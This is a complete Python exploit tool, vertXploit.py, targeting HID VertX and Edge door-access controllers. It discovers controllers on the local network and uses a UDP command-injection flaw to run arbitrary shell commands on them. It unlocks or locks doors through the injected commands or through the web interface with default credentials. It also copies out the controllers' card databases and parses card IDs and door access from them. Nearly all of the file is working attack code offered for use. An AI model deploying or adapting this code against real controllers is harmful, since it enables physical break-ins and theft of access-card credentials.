#!/usr/bin/env python
# Copyright (c) 2016, Brandan Geise [coldfusion]
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
import argparse
import netifaces
import nmap
import os
import re
import requests
import socket
import tabulate
import time

try:
	requests.packages.urllib3.disable_warnings()
except:
	pass


def main():
	parser = argparse.ArgumentParser(prog='vertXploit.py', description='Exploit HID VertX and Edge door controllers through command injection or the web interface.', usage='vertXploit.py <action> [<args>]')
	group = parser.add_mutually_exclusive_group(required=True)
	group.add_argument('-a', dest='action', help='Action to perform on VertX controller', choices=['discover', 'unlock', 'lock', 'download', 'dump'])
	group.add_argument('-r', dest='raw', help='Linux command, (example: ping -c 5 IP)', nargs='+')

	host_group = parser.add_argument_group('host arguments')
	host_group.add_argument('--ip', dest='ip', help='VertX controller IP address, (default: 255.255.255.255)', default='255.255.255.255', required=False)
	host_group.add_argument('--port', dest='port', help='VertX controller port, (default: 4070)', default=4070, type=int, required=False)

	auth_group = parser.add_argument_group('authentication arguments')
	auth_group.add_argument('--username', help='VertX web interface username, (default: root)', default='root', required=False)
	auth_group.add_argument('--password', help='VertX web interface password, (default: pass)', default='pass', required=False)

	parser.add_argument('--path', help='Path to database files', default='.', required=False)
	args = parser.parse_args()

	# Discover
	if args.action == 'discover':
		discover(args.ip, args.port, args.action)

	# Dump
	elif args.action == 'dump':
		# Check if database files exist
		if os.path.isfile("{0}/IdentDB".format(args.path)) and os.path.isfile("{0}/AccessDB".format(args.path)):
			print_status('Processing card information from VertX database')
			identdb_data = read_db("{0}/IdentDB".format(args.path))
			accessdb_data = read_db("{0}/AccessDB".format(args.path))

			# Parse databases
			parse_db(identdb_data, accessdb_data)
		else:
			print_error("Could not find IdentDB or AccessDB in {0}".format(os.path.abspath(args.path)))

	# Raw
	elif args.raw:
		raw(args.ip, args.port, args.raw)

	# Unlock, lock, or download
	else:
		door_actions(args.ip, args.port, args.username, args.password, args.action)


# Send raw Linux command
def raw(ip, port, command):
	vertx_mac, vertx_ip, vertx_version, vulnerable = discover(ip, port, 'raw')

	# Check if vulnerable to command injection
	if vulnerable:
		if vertx_ip and ip == '255.255.255.255':
			ip = vertx_ip

		payload = "{0};1`{1}`;".format(vertx_mac, ' '.join(command))
		print_status('Sending raw payload')
		send_command(ip, port, 'command_blink_on;', payload)
	else:
		print_error('VertX controller is not vulnerable to command injection')


# Perform action on VertX controller
def door_actions(ip, port, username, password, action):
	HEADERS = {
		'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36',
		'Accept': '*/*',
		'Accept-Language': 'en-US,en;q=0.5',
		'Accept-Encoding': 'gzip, deflate',
		'Connection': 'keep-alive'
	}

	vertx_mac, vertx_ip, vertx_version, vulnerable = discover(ip, port, action)

	if vertx_ip and ip == '255.255.255.255':
		ip = vertx_ip

	# Download databases
	if vulnerable and action == 'download':
		print_status('Downloading VertX databases')
		upload_script(ip, port, vertx_mac, vertx_version, action)
		download_db(ip, HEADERS, username, password)

	# Unlock or lock doors using command injection
	elif vulnerable and 'lock' in action:
		print_status("{0}ing doors using command injection".format(action.capitalize()))
		upload_script(ip, port, vertx_mac, vertx_version, action)
		print_good("Door successfully {0}ed".format(action))

	# Unlock or lock doors using web interface
	elif 'lock' in action:
		print_status("{0}ing doors through the web interface".format(action.capitalize()))
		response = web_request(ip, vertx_version, HEADERS, username, password, action)
		if response:
			print_good("Door successfully {0}ed".format(action))
		elif response is False:
			print_warn("Door {0} failed, bad credentials".format(action))
		else:
			print_error('VertX controller did not respond')

	else:
		print_warn("VertX controller is not vulnerable, can not use '{0}' action".format(action))


# Search for VertX controllers on the network
def discover(ip, port, action):
	controllers = []

	# Send VertX discovery request
	response_data = send_command(ip, port, 'discover;013;', None)
	if response_data:
		vertx_mac, vertx_ip, vertx_version, vulnerable = fingerprint(response_data, action)

		if action == 'discover':
			controllers.append([vertx_ip, '4070', vertx_mac, 'broadcast'])
		else:
			return vertx_mac, vertx_ip, vertx_version, vulnerable

		# Use nmap to look for MAC address and open ports
		if ip == '255.255.255.255' and action == 'discover':
			default_gateway = netifaces.gateways()
			local_ip = default_gateway['default'][netifaces.AF_INET][0]
			network_cidr = "{0}.0/24".format('.'.join(local_ip.split('.')[:-1]))

			print_status("Starting Nmap scan on {0}".format(network_cidr))

			nm = nmap.PortScanner()
			nm.scan(network_cidr, arguments='-n -sS --open -Pn -p4050')
			for host in nm.all_hosts():
				try:
					controller = []
					ip = nm[host]['addresses']['ipv4']
					mac = nm[host]['addresses']['mac']

					# Check open port
					if nm[host].has_tcp(4050) and nm[host]['tcp'][4050]['state'] == 'open':
						controller.append('4050')

					# MAC address search
					mac_regex = re.search('^((?i)00:06:8E:[a-f0-9:]{8})', mac)
					if mac_regex:
						controller.append(mac)

					# Prepend IP if port or MAC is found
					if controller:
						for entry in controllers:
							if entry[0] == ip:
								entry[1] = "{0}/4050".format(entry[1])
								entry[3] = "{0}/nmap".format(entry[3])
							else:
								controller.insert(0, ip)
								controller.append('nmap')
								controllers.append(controller)

				except Exception as error:
					continue

				if len(controllers) > 0:
					print_good('VertX controllers found:')
					print(tabulate.tabulate(controllers, headers=['IP', 'Port', 'MAC', 'Method'], tablefmt='psql', stralign='center', numalign='center'))
				else:
					print_warn('No VertX controllers found')


# Get information about VertX controller
def fingerprint(data, action):
	response_data = data[0].split(';')

	# Legacy VertX controllers patched with 2.2.7.568
	if int(response_data[7][0]) == 2 and int(response_data[7].replace('.', '')) < 227568:
		vulnerable = True

	# EVO VertX controllers patched with 3.5.1.1483
	elif int(response_data[7][0]) == 3 and int(response_data[7].replace('.', '')) < 3511483:
		vulnerable = True

	else:
		vulnerable = False

	if action == 'discover':
		print_good("VertX Controller Information")
		print("RAW (ASCII): {0}".format(data))
		print("Name: {0}".format(response_data[3]))
		print("Model: {0}".format(response_data[6]))
		print("Version: {0} - ({1})".format(response_data[7], response_data[8]))
		print("IP Address: {0}".format(response_data[4]))
		print("MAC Address: {0}".format(response_data[2]))

		if vulnerable:
			print("Vulnerable: \033[1m\033[32mTrue\033[0m\n")
		else:
			print("Vulnerable: \033[1m\033[33mFalse\033[0m\n")

	return response_data[2], response_data[4], response_data[6], vulnerable


# Upload script
def upload_script(ip, port, mac, version, action):
	if action == 'unlock':
		commands = [
			"export QUERY_STRING=\"?ID=0&BoardType={0}&Description=Strike&Relay=1&Action=1\"".format(version),
			'/mnt/apps/web/cgi-bin/diagnostics_execute.cgi',
			'chmod -x /mnt/apps/web/cgi-bin/diagnostics_execute.cgi'
		]

	elif action == 'lock':
		commands = [
			'chmod +x /mnt/apps/web/cgi-bin/diagnostics_execute.cgi',
			"export QUERY_STRING=\"?ID=0&BoardType={0}&Description=Strike&Relay=1&Action=0\"".format(version),
			"/mnt/apps/web/cgi-bin/diagnostics_execute.cgi"
		]

	else:
		commands = [
			'cp /mnt/data/config/IdentDB /mnt/apps/web/',
			'cp /mnt/data/config/AccessDB /mnt/apps/web/',
			'sleep 15',
			'rm /mnt/apps/web/IdentDB',
			'rm /mnt/apps/web/AccessDB'
		]

	print_status("Sending payload to {0}".format(ip))
	payload_chunks = list(chunk_string('!'.join(commands), 22))
	for chunk in payload_chunks:
		payload = "{0};1`echo '{1}' >> /tmp/a`;".format(mac, chunk)
		send_command(ip, port, 'command_blink_on;', payload)

	print_good('Payload uploaded successfully')
	time.sleep(1)

	format_payloads = [
		[
			"{0};1`tr -d '\n' < /tmp/a > /tmp/b`;".format(mac),
			"{0};1`tr '!' '\n' < /tmp/b > /tmp/a`;".format(mac),
			"{0};1`chmod +x /tmp/a`;".format(mac),
			"{0};1`/tmp/a`;".format(mac)
		],
		[
			"{0};1`rm /tmp/a`;".format(mac),
			"{0};1`rm /tmp/b`;".format(mac)
		]
	]

	print_status('Formating and executing payload')
	for payload in format_payloads[0]:
		send_command(ip, port, 'command_blink_on;', payload)

	print_status('Sleeping for 10 seconds before cleaning up')
	time.sleep(10)

	for payload in format_payloads[1]:
		send_command(ip, port, 'command_blink_on;', payload)


# Trigger command injection
def send_command(ip, port, command, payload):
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.settimeout(5)
	if ip == '255.255.255.255':
		s.bind(('', 0))
		s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

	if payload:
		print("({0})".format((payload.rstrip()).replace('\n', '\\n')))
		payload_buffer = "{0}{1};{2}".format(command, str(len(command) + len(payload) + 4).zfill(3), payload)
	else:
		print_status("Sending discovery request to {0}".format(ip))
		payload_buffer = command

	try:
		payload_response = None
		s.sendto(payload_buffer, (ip, port))
		payload_response = s.recvfrom(1024)
		if payload_response:
			if payload and payload_response[0].split(';')[0] != 'ack':
				print_error('Payload upload failed')
	except socket.timeout:
		print_error('VertX controller did not respond')

	s.close()
	if payload_response:
		return payload_response
	else:
		exit()


# VertX actions through web interface
def web_request(ip, version, headers, username, password, action):
	if action == 'unlock':
		url = "http://{0}/cgi-bin/diagnostics_execute.cgi?ID=0&BoardType={1}&Description=Strike&Relay=1&Action=1&MS={2}406".format(ip, version, str(int(time.time())))
	else:
		url = "http://{0}/cgi-bin/diagnostics_execute.cgi?ID=0&BoardType={1}&Description=Strike&Relay=1&Action=0&MS={2}406".format(ip, version, str(int(time.time())))

	try:
		response = requests.get(url, headers=headers, auth=(username, password), verify=False)
		if response.status_code == 401:
			return False
		else:
			vertx_response = (response.text).split(';')[1]
			if vertx_response == '-1504':
				return True
			elif vertx_response == '0':
				return False
			else:
				return None
	except requests.exceptions.RequestException as error:
		return None


# Download database
def download_db(ip, headers, username, password):
	databases = ['IdentDB', 'AccessDB']

	for database in databases:
		try:
			url = "http://{0}/{1}".format(ip, database)
			download = requests.get(url, headers=headers, auth=(username, password), stream=True, verify=False)
			if download.status_code == 200:
				with open(database, 'wb') as f:
					for chunk in download.iter_content(chunk_size=1024):
						f.write(chunk)
				f.close()
				print_good("Successfully downloaded {0}".format(database))
			elif download.status_code == 401:
				print_warn('Download failed, bad credentials')
			else:
				print_error("Unable to find database at {0}".format(url))
		except Exception as error:
			print_error('VertX controller web interface did not respond')


# Pull info from databases
def read_db(db):
	data = []
	counter = 1
	entry = 0

	with open(db, 'rb') as file_stream:
		if 'IdentDB' in db:
			block_size = 28
		else:
			block_size = 44

		while entry < 255:
			card_block = file_stream.read(block_size)
			if card_block:
				if (counter == 1) or (counter % block_size == 1):
					card_data = ''
					entry += 1
					counter = 1

				for character in card_block:
					card_data += "{0:0{1}X}".format(ord(character), 2)
					counter += 1

				data.append(card_data)
			else:
				break

	file_stream.close()

	return data


# Parse card information from databases
def parse_db(identdb, accessdb):
	card_data = []

	# Get card info from IdentDB
	for i_entry in identdb:
		I_ENTRY_NUMBER = 16
		I_CARD_ID = 10
		I_ENABLED = 24

		db_id = i_entry[(I_ENTRY_NUMBER * 2):(I_ENTRY_NUMBER * 2) + 2]
		card_id = i_entry[0:I_CARD_ID * 2]
		card_status = i_entry[I_ENABLED * 2:(I_ENABLED * 2) + 2]

		# Get card status from IdentDB
		if card_status == '00':
			enabled = 'True'
		elif card_status == '01':
			enabled = 'False'
		else:
			enabled = 'Unknown'

		# Get door access from AccessDB
		for a_entry in accessdb:
			A_ENTRY_NUMBER = 0
			A_DOOR_ACCESS = 8

			accessdb_id = a_entry[A_ENTRY_NUMBER * 2:(A_ENTRY_NUMBER * 2) + 2]
			if accessdb_id == db_id:
				door_access = a_entry[A_DOOR_ACCESS * 2:(A_DOOR_ACCESS * 2) + 2]
				break
			else:
				continue

		database_row = [db_id, card_id, door_access, enabled]
		card_data.append(database_row)

	if len(card_data) > 0:
		print(tabulate.tabulate(card_data, headers=['DB ID', 'Card ID', 'Door', 'Enabled'], tablefmt='psql', stralign='center', numalign='center'))
	else:
		print_warn('No cards in database')


# Split command because of 22 character length limit
def chunk_string(command, length):
	return (command[0 + i:length + i] for i in range(0, len(command), length))


def print_error(msg):
	print("\033[1m\033[31m[-]\033[0m {0}".format(msg))


def print_status(msg):
	print("\033[1m\033[34m[*]\033[0m {0}".format(msg))


def print_good(msg):
	print("\033[1m\033[32m[+]\033[0m {0}".format(msg))


def print_warn(msg):
	print("\033[1m\033[33m[!]\033[0m {0}".format(msg))

if __name__ == '__main__':
	main()
